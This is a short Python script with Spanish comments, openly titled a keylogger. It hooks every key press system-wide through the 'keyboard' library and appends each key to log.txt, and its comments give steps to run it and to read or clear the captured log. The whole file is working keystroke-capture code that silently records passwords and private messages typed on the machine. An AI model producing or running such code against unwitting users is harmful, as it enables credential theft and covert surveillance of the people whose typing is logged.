# programa que registra las teclas presionadas por el usuario y las guarda en un archivo de texto
# para ejecutarlo, se debe correr el comando "python keylogger.py" en la terminal   
# para detenerlo, se debe presionar la combinacion de teclas "ctrl + c"
# para ver el archivo de texto generado, se debe correr el comando "cat log.txt" en la terminal 
# para limpiar el archivo de texto generado, se debe correr el comando "echo > log.txt" en la terminal
# para ver el contenido del archivo de texto generado, se debe correr el comando "cat log.txt" en la terminal
import keyboard

def press(key):
    # print(key.name)

    with open("log.txt", "a") as file:
        if key.name == "space":
            file.write(" ")
        else:
            file.write(key.name)

keyboard.on_press(press)

keyboard.wait()